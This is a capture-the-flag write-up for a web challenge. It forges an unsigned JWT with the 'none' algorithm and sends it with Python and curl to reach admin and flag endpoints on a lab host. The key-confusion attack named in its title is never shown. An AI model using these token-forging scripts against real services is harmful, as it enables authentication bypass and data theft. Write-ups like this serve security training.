---
title: "JWT None Algorithm & Key Confusion"
event: "STUDIO Comp 2026"
category: "Web"
difficulty: "Medium"
solvedDate: 2026-09-25
tags: ["jwt", "auth-bypass", "crypto", "nodejs"]
isPublic: true
author: "STUDIO"
summary: "Bypassing authentication by exploiting an insecure JWT verification parser accepting 'none' algorithm and public key signature confusion."
dossier:
  targetIp: "10.10.11.142"
  os: "Alpine Linux (Docker Node.js 20)"
  arch: "x86_64"
  cve: "CWE-347 (Improper Verification of Cryptographic Signature)"
  services: ["80/TCP (Nginx / Express.js API)", "22/TCP (SSH OpenSSH 9.3)"]
---

## Phase 1: Recon & Token Capture

Inspecting HTTP traffic in Burp Suite when authenticating as guest revealed a session bearer token stored in local storage.

```bash
# Decoding the captured JWT header and payload:
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# {"alg":"HS256","typ":"JWT"}

echo "eyJzdWIiOiJndWVzdCIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzI3MjUyMDAwfQ" | base64 -d
# {"sub":"guest","role":"user","iat":1727252000}
```

---

## Phase 2: Algorithm None Vulnerability Discovery

We tested modifying the algorithm header from `HS256` to `none` (and case-variations like `None` / `NONE`) with an empty signature section.

```python
import hmac
import hashlib
import base64
import json

header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "admin", "role": "administrator", "iat": 1727252000}

def b64url(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b'=').decode()

forged_token = f"{b64url(header)}.{b64url(payload)}."
print("[+] Forged token with none alg:", forged_token)
```

---

## Phase 3: Exploitation via Python Automation

Submitting the forged token to the privileged `/api/v1/vault/keys` endpoint bypassed authorization middleware and yielded administrative data access.

```python
#!/usr/bin/env python3
import requests

TARGET = "http://10.10.11.142/api/v1/vault/keys"
FORGED_JWT = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbmlzdHJhdG9yIiwiaWF0IjoxNzI3MjUyMDAwfQ."

headers = {
    "Authorization": f"Bearer {FORGED_JWT}",
    "Content-Type": "application/json"
}

print("[*] Sending forged administrator token...")
r = requests.get(TARGET, headers=headers)

if r.status_code == 200:
    print("[+] SUCCESS! Admin vault accessed:")
    print(r.json())
else:
    print(f"[-] Request rejected with status: {r.status_code}")
```

---

## Phase 4: Flag Extraction

With administrative access established, we queried the secret vault endpoint `/api/v1/vault/flag` to capture the challenge flag.

```bash
curl -s -H "Authorization: Bearer $FORGED_JWT" http://10.10.11.142/api/v1/vault/flag
# Output: {"status":"authenticated","flag":"STUDIO{jwt_n0n3_4lg_byp4ss_succ3ss_78fa}"}
```
